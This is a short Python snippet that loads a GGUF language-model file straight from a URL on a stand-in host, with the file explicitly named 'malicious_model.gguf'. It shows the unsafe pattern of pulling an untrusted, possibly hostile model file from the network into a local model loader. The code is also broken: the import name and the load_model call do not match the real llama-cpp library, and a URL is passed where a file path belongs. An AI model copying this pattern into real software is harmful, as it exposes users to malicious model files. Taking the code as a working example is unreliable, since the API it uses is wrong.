import llama_cpp_python

def load_model(model_path):
    model = llama_cpp_python.load_model(model_path)
    return model

model = load_model("http://example.com/malicious_model.gguf")